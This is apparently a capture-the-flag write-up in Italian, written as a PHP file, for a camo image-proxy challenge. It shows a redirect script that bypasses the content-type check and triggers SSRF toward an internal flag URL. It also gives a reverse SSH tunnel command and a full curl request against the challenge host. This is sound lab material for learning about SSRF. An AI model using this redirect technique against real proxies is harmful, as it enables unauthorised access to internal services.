<?php
//A. Creazione dell'Exploit (camp.php)

//  Creiamo un file chiamato camo.php sulla nostra macchina locale Arch. Questo script funge da "ponte malevolo".
//  1. Bypass del controllo Content-Type:
//  Il proxy si aspetta un'immagine. Gli diciamo che siamo un PNG. [cambia estensione in base a cio' che richiede]
    header('Content-Type: image/png');

//  2. Trigger del Redirect (SSRF):
//  Diciamo al proxy di andare a leggere l'URL interno della flag.
    header('Location: http://127.0.0.1/get_flag.php');

exit();

//B. Esposizione locale e Tunneling

//  Per rendere lo script raggiungibile dal server della sfida, abbiamo usato due comandi:

//  Web Server Locale:
//    php -S 127.0.0.1:5000
//    Mette in ascolto il file camo.php sulla nostra porta 5000.

//  Reverse SSH Tunnel (Serveo):
//    ssh -R 80:localhost:5000 serveo.net
//    Crea un tunnel pubblico che punta alla nostra porta locale 5000.

//C. Body form
// title: qualsiasi cosa
// body: [img]URL_Tunnel[/img]

//l'HMAC viene generato dal server per "firmare" l'URL che hai inserito, garantendo che nessuno possa modificarlo senza conoscere la chiave segreta (che risiede sul server).
//Ecco come lo recuperi tecnicamente:
//  1) Fai click destro sull'immagine rotta o sul placeholder.
//  2) Seleziona "Ispeziona" (o premi F12 e vai nel tab Elements).
//  3) Cerca il tag <img>. Vedrai un attributo src fatto così:
//     src="/camo.php?url=https%3A%2F%2F...&hmac=f788b73ca42a850a4f26544af514784b"

//D. Payload
// Questo e' il comando usato ma non sara' uguale per tutti:
// curl -v 'http://302camo.challs.cyberchallenge.it/camo.php?url=https%3A%2F%2Fc8531210f97f980f-93-42-32-118.serveousercontent.com%2Fcamo.php&hmac=f788b73ca42a850a4f26544af514784b'
// Analizziamolo:

// Parte,               Valore nel tuo esempio,                                     Descrizione
// Base URL,            http://302camo.challs.cyberchallenge.it/camo.php,           "È l'indirizzo del server "vittima" e dello script che stiamo colpendo."
// Separatore,          ?,                                                          Indica al browser (o a curl) che tutto ciò che segue sono parametri (Query Strings).
// Parametro 1: URL,    url=https%3A%2F%2Fc853...camo.php,                          È l'input che diamo al server: l'indirizzo del nostro tunnel Serveo.
// Separatore,          &,                                                          Divide un parametro dal successivo.
// Parametro 2: HMAC,   hmac=f788b73ca42a850a4f26544af514784b,                      È la firma digitale che valida l'URL precedente.

// C.1 URL ENCODING
// Poiché caratteri come :, / e ? hanno significati speciali negli URL,
// se vogliamo inviare un URL dentro un altro URL, dobbiamo "proteggerli" convertendoli in esadecimali:
//    %3A → : (due punti)
//    %2F → / (slash)
//    %3F → ? (punto interrogativo)

?>